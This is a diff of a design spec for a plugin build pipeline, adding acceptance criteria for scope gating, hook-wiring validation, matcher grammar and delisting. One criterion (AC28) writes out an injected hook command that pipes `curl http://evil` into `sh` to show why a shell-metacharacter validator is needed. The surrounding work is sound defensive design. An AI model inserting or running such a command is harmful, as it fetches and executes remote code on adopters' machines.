@@ -55,12 +55,23 @@ directory rather than the plugin root. `build/main.py` *assigns*
 Defects 1 and 2 are adopter-visible and are the deliverable: seven packs stop
 being published and stop being advertised as plugins.
 
-Defect 3's fix ships **no hook activation today**. `packs/core` is the only pack
-that ships `.apm/hook-wiring/`, and it is repo-only, so it is one of the seven
-that drop. The hook work makes the route correct for the next user-capable pack
-that ships hooks; it does not light anything up now. It belongs in the same
-change — fixing 1 without 3 leaves a route that silently drops hooks the day a
-user-capable pack authors them — but it is not worth overstating.
+Defect 3's fix activates no hook *today*, because `packs/core` is the only pack
+shipping `.apm/hook-wiring/` and it is one of the seven. It is not speculative
+work, though — it is the precondition for two things:
+
+- **RFC-0008's install→adapt chain on this route.** The synthetic install-marker
+  hook keeps being written for the 14 published packs, unchanged. Both readers of
+  `.adapt-install-marker.toml` — `packs/core/.apm/hooks/session-start.py` and the
+  `adapt-to-project` skill — live in `core`, so on this route the *automatic
+  nudge* is reachable only for an adopter who also has `core` installed at repo
+  scope (the normal case, since `core` is the pack you install into a repo). The
+  user-scope path re-lights the moment a user-capable pack ships a session-start
+  hook, and this spec is what makes such a hook work at all.
+- **Any future user-scoped pack's hooks.** Without this, the route silently drops
+  them the day one is authored.
+
+RFC-0008 is therefore **dormant on the user-scope path, not falsified**, and
+takes no erratum. The spec records the dormancy where the route is documented.
 
 Pack scopes are **not** changed to make any of this work. `packs/core` stays
 `allowed-scopes = ["repo"]`; repo-scoped packs are repo-scoped deliberately, and
@@ -77,6 +88,14 @@ adopters reach them through the direct adapter, which is the route built for it.
   upstream wins; a local departure must be *restrictive*).
 - Fail loud at build time, naming pack, wiring file, and command.
 - Verify with the real `claude` client (2.1.223).
+
+### Ask first
+
+- **Widening any pack's `allowed-scopes`.** After AC1 that is a decision to
+  publish that pack's code and hooks to a public marketplace, not a metadata
+  tweak. Owner approval, every time.
+- Changing the interpreter a pack's hook commands invoke (`python` vs `python3`;
+  bare `python` is absent on stock macOS). Pre-existing on every route.
 
 ### Never do
 
@@ -316,6 +335,113 @@ AC7's quoting discipline is what makes shell form safe.
   receives an erratum recording that AC17 supersedes that layout and that its
   subject pack (`core`) no longer publishes to this route at all. The body is not
   edited.
+
+### Round-4 additions
+
+- [ ] **AC24 — All three marketplace/artifact writers share one predicate.**
+  AC1's filter applies at the recipe, at the dist aggregation, **and at
+  `build/self_host.py:_aggregate_marketplace`**, which writes the repo-root
+  `.claude-plugin/marketplace.json` that `claude plugin marketplace add
+  eugenelim/agent-ready-repo` actually resolves. That function carries a contrary
+  design note ("intentionally ignores the pack filter — the catalogue advertises
+  every pack"); this spec overturns it, and says so at the note.
+
+  The two writers have **already drifted**: `catalogue-curation` is listed in the
+  repo-root marketplace today and is absent from `origin/claude-plugins-dist`.
+  Leaving an entry whose `source.path` no longer exists on the branch turns a
+  clean "not offered" into a dangling fetch. ADR-0072 records this same function
+  as the writer missed last time.
+
+- [ ] **AC25 — The predicate's absent-declaration rule is explicit.** A pack with
+  no `[pack.install]` table resolves to `["repo"]`, matching
+  `commands/validate.py:_allowed_scopes`, which is **reused, not re-derived**.
+  Several test fixtures omit the table; each fixture whose tests assert
+  claude-plugins output declares `allowed-scopes = ["repo", "user"]` explicitly
+  rather than relying on a default.
+
+- [ ] **AC26 — Rail B's consent gesture is part of the qualifying shape.**
+  `build/scope_rails.py:check_hooks` refuses a pack declaring `"user"` while
+  carrying `.apm/hooks/` or `.apm/hook-wiring/` unless it also sets
+  `[pack.install] user-scope-hooks = true`. AC7's fixture and AC18's subject pack
+  therefore declare both `allowed-scopes ∋ "user"` and that flag; without it they
+  fail `agentbundle validate`. The flag is the author's explicit "yes, my hooks
+  land on the adopter's machine outside per-project isolation" — exactly the
+  consent this route needs.
+
+- [ ] **AC27 — The site gates on a field derived from `allowed-scopes`.** The
+  existing `scope` field in `web/src/content.config.ts` is populated from
+  `default-scope` (`tools/build-site.py:67`), not `allowed-scopes` — so gating on
+  it would hide `product-documentation` (`default-scope = "repo"`,
+  `allowed-scopes = ["repo","user"]`), which AC1 publishes. A new derived field
+  carries user-capability, and AC4 gates on that.
+
+- [ ] **AC28 — Authored command strings are mechanically constrained.** The
+  shared validator raises on a `command` containing `` ` ``, `$(`, `;`, `&`,
+  `|`, `>`, `<`, or a newline outside the rewritten path.
+
+  This spec is what makes authored commands *execute* on this route — they are
+  published inert today — so the diff introduces the boundary crossing. AC10-AC12
+  close splice *corruption*, not authoring: `python tools/hooks/x.py; curl
+  http://evil | sh` satisfies all three and publishes verbatim. "Trusted modulo
+  PR review" is not sufficient once `assimilate-repo` and
+  `propose-catalogue-pack` make third-party pack content a reachable source.
+
+- [ ] **AC29 — AC11's predicate is relative-path-shaped, not basename-shaped.**
+  Any fragment that is a relative path — contains `/`, no leading `/`, no
+  `${CLAUDE_PLUGIN_ROOT}` after rewriting — raises. Strictly stronger than the
+  basename reading and drops its ambiguity: under basename equality
+  `vendor/tools/hooks/x.py` neither rewrites (AC10 declines it, unanchored) nor
+  raises, publishing a relative path that `sh` resolves against the adopter's
+  working directory at hook-fire time.
+
+  Separately, an occurrence inside a **single-quoted** region raises: `sh` does
+  not expand `${CLAUDE_PLUGIN_ROOT}` there, so the hook silently never runs while
+  AC11's textual check passes — the invisible-dropped-hook outcome AC13 refuses.
+
+- [ ] **AC30 — The lint dry-runs the full compiler, on every wiring pack.**
+  AC22's shared validators exclude AC10's splice and AC11's completeness and
+  confinement checks — and AC3 guarantees a repo-only pack never reaches the
+  compiler, so `packs/core`'s wiring, the only real wiring in the tree, would be
+  the one wiring those checks never run against. The lint therefore dry-runs
+  `compile_plugin_hooks` against **every** pack shipping `.apm/hook-wiring/`,
+  publishable or not, converting each raise to a finding.
+
+- [ ] **AC31 — Matcher grammar drops the anchors.**
+  `^[A-Za-z0-9_-]+(\|[A-Za-z0-9_-]+)*$` — bare literal alternations only.
+  `^Bash|Edit$` parses as `(^Bash)|(Edit$)`, which matches `BashTool` and
+  `MyEdit` and misses `EditFile`, firing a hook on tools it was not scoped to.
+  AC14's widening procedure applies to this grammar too.
+
+- [ ] **AC32 — Delisting is not revocation.** AC6's remedy names
+  `claude plugin uninstall <pack>@agent-ready-repo` as step one: the filter
+  removes the marketplace entry and the branch directory but uninstalls nothing,
+  so an adopter keeps running a pinned, permanently-unmaintained copy whose
+  install-marker hook keeps firing — and following the remedy without
+  uninstalling leaves two unrelated copies of the pack's skills. AC18 gains an
+  install-then-delist run recording what the client actually does to an
+  installed-but-delisted plugin.
+
+- [ ] **AC33 — The install-marker hook ships only when a reader exists.** The
+  synthetic `SessionStart` install-marker entry is emitted into a pack's manifest
+  only when at least one pack in the published set ships a marker *reader*.
+  Today none does, so the 14 published plugins ship with an empty `hooks` block
+  and AC8's "marker present whether or not the pack authors `SessionStart`"
+  applies only under that condition.
+
+  **Why reader-existence and not "this pack ships hooks".** RFC-0008's writer is
+  per-pack self-announcement — each plugin's marker says *this pack was just
+  installed* — while the reader is separate and singular. Gating on the pack's
+  own hook block would stop hookless packs announcing themselves, which is a real
+  regression the day a reader appears. Reader-existence is the condition that is
+  correct both now and then.
+
+  **What it buys.** Today every published plugin runs a Python subprocess at
+  every session start to write a file nothing reads. That stops.
+
+  **What it costs.** A pack's manifest now depends on the composition of the
+  published set: adding a reader pack changes the other manifests. The build is
+  deterministic over that set and AC19's idempotency assertion covers it, but the
+  coupling is real and is recorded here rather than discovered later.
 
 ## Testing Strategy
 
